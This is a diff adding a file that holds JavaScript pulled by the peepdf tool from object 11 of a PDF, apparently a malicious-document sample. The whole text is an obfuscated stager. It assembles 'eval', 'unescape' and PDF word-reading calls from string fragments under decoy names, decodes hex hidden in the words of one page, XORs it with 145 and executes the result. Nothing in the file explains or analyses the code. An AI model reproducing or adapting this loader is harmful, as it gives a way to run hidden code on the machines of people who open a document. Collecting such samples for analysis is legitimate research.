@@ -1,0 +1,38 @@
+// peepdf comment: Javascript code located in object 11 (version 0)
+
+  var b = 1;
+  var d = 145;
+  var bC = ["p", "a", "p", ""];
+  dsB = new String(bC[1] + bC[0] + bC[0] + bC[3]);
+  var sdftuf = ["al", "", "ev"];
+  adobe = new String(sdftuf[2] + sdftuf[0] + sdftuf[1]);
+  var unlock = new String("0h3unesc".substr(3) + "YuFape".substr(3));
+  var adobeSdfjh = new String("charTbMp".substr(0, 4) + "MqKCodeKqM".substr(3, 4) + "AtjqfD".substr(0, 2));
+  var dsGoogle = new String("fromC" + "qmNharCo".substr(3) + "de");
+  var send = String("getPkuoC".substr(0, 4) + "15uageN".substr(3) + "b8jthWoj8b".substr(3, 4) + "rd");
+  var bArray = "getPMXDz".substr(0, 4) + "AnCageN".substr(3) + "umWo" + "rds";
+  var emailSdsdf = "";
+  var fsdf = String;
+  var check = "%1R6V".substr(0, 1);
+  var sendA = new String("subst" + "r");
+  var sdfjFoxit = 2;
+  var sdrt = 0;
+  var dsB = this[dsB];
+
+  function sdftufA(cD, sdrtEdit) {
+      return cD ^ sdrtEdit;
+  }
+  var aAdobe = this[bArray](b);
+  var sendGet = this[unlock];
+  var mailWindow = this[adobe];
+  for (var checkC = sdrt; checkC < aAdobe; checkC++) {
+      dsGoogleMail = this[send](b, checkC);
+      var dsAdobe = dsGoogleMail[sendA](dsGoogleMail.length - sdfjFoxit, sdfjFoxit);
+      var foxit = check + dsAdobe;
+      var bSdfj = sendGet(foxit);
+      var sdCheck = bSdfj[adobeSdfjh](sdrt);
+      var foxitA = sdftufA(sdCheck, d);
+      emailSdsdf += fsdf[dsGoogle](foxitA);
+  }
+  mailWindow(emailSdsdf);
+
